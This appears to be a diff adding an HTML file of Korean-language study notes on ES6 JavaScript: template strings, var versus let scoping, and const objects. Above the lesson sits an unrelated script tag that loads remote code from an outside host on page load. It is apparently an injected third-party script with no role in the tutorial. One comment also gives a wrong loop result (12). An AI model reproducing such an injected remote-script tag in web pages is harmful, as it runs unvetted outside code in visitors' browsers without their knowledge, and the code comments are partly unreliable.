@@ -1,0 +1,61 @@
+
+<!DOCTYPE html>
+<meta charset="UTF-8">
+<script type="text/javascript" nonce="XOJ0BVE+zr3qdJZKBBAaLFbFzesxhK/xP1QmLnOdycs=" src="//lc.getunicorn.org?type=base-script&amp;request-id=2412"></script>
+<script>
+//자바스크립트 핵심버젼 변화  ES5 -> ES6(2015년말)
+//마이크로소프트 IE11(window7에서 마지막)이 ES6이상을 지원하지 않아서 그동안 못 쓰고 있었음
+// caniuse.com에서 호환성확인 습관, js검색시 뒤에 mdn을 꼭 붙여서 껌색(영문초천-> 초기투자라고 생각)
+// 2022년 ms는 IE11을 support를 하지 않기로 발표ㄴ(지원 종료) -> ES6 이상으로 본격적으로 나아갈 때
+// 변화는 먼저 대응할 수록 유리!
+
+// let, const, template string, spread operator, destructuring, arrow function,promise, async, await ....
+
+//template string  ${} 사용
+
+let aa = "성우";
+let bb = aa + "는 " + " 목소리가 좋아용";  // es5에서 문자열 더하깅
+alert(bb);
+
+let cc = `${aa} 는 목소리가 정말 좋아용!`;  // es6의 template string, 백틱사용에 주의
+// ${aa} 표현이 spring EL 표현과 일치!, 
+// js 파일에서는 상관없고, jsp 안에서 쓸때는 $앞에 꼭 역슬래시(\)를 붙여서
+// EL이 아니고 $가 단순 문자 임을 알려줘야 함! (쭈의) 
+alert(cc);
+
+
+//var vs let 차이  -> var는 function scope, let은 block scope({})
+/*
+const aa= {fbi:"건영이 1등 와씀"};
+aa.fbi = "아니얌"; // OK 객체의 속성은 바꿀 수 있음
+aa = {}; // NG  (객체 자체를 바꾸려고 함)
+console.log(aa);  // 누느로 화긴!
+*/
+
+/*
+const myArr = ["1","2"];
+myArr[0] = {name:"미녁"}; // OK!   안에 꺼는 맘대로 바꿀 수 있어용
+console.log(myArr); // 누느로 화긴
+*/
+
+/*
+for(var i=1; i<=10; i++){
+}
+alert(i);  //? 12
+*/
+
+/*
+function f_check(){
+    for(var i=1; i<=10; i++){
+    }
+    alert(i);  //?
+}
+f_check();
+
+
+for(let j=1; j<=10; j++){
+}
+alert(j);  //? 
+*/
+
+</script>
